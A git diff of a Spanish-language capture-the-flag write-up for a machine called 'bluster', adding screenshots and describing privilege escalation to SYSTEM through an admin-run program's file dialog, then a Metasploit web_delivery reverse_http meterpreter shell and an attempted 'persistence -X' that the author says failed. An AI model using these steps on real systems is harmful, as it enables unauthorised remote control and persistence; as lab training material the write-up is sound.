@@ -30,13 +30,21 @@ Si nos fijamos bien en el escritorio, hay un ejecutable, le damos a abrir con ad
 
 Luego tendremos que irnos al navegador, configuración y guardar archivo y nos vamos a la ruta C:\Windows\System32 y luego en la parte de arriba pondremos C:\Windows\System32\cmd.exe, abrimos la cmd y ejecutamos whoaami y somos nt authority\system.
 
+![Write_up_maquinas/maquina3-bluster/img/img05.png](https://github.com/alvarobueno21/Hacking_Etico/blob/02e1892b61915bcb643f7e93fd2eb0311651ed9b/Write_up_maquinas/maquina3-bluster/img/img05.png)
+
 Si entramos en la terminal y hacemos un dir vemos un root.txt donde esta la flag.
 
+![Write_up_maquinas/maquina3-bluster/img/img06.png](https://github.com/alvarobueno21/Hacking_Etico/blob/02e1892b61915bcb643f7e93fd2eb0311651ed9b/Write_up_maquinas/maquina3-bluster/img/img06.png)
 
 Ahora nos iremos a hacer un sudo msfconsole y con el comando search exploit/multi/script/web_delivery nos pondremos a ejecutar el exploit.
 
+![Write_up_maquinas/maquina3-bluster/img/img07.png](https://github.com/alvarobueno21/Hacking_Etico/blob/02e1892b61915bcb643f7e93fd2eb0311651ed9b/Write_up_maquinas/maquina3-bluster/img/img07.png)
+
 Ahora tendremos que poner el siguiente comando: set payload windows/meterpreter/reverse_http y luego ejecutar run -j
 
-Una vez hagamos esto tendremos que copiarnos la salida del comando y ejecutarlo en la shell de windows, luego nos vamos a sessions en metasploit y vemos que tenemos una activa que es un meterpreter.
+![Write_up_maquinas/maquina3-bluster/img/img08.png](https://github.com/alvarobueno21/Hacking_Etico/blob/02e1892b61915bcb643f7e93fd2eb0311651ed9b/Write_up_maquinas/maquina3-bluster/img/img08.png)
 
-Por ultimo hacemos un sysinfo y luego un run persistence -X
+Una vez hagamos esto tendremos que copiarnos la salida del comando y ejecutarlo en la shell de windows, primero nos abrimos un servidor python en nuestro kali con python3 -m http.server y nos copiamos el contenido del fichero a la powershell de Windows.
+
+Luego si nos vamos a metasploit nos debería de crear una reverse shell y si ejecutamos persistence -X podremos obtener persistencias pero desgraciadamente no hemos podido crearla ya que una vez metiamos este comando en el windows se nos cerraba la powershell y metasploit no nos dejaba crear la reverse shell.
+
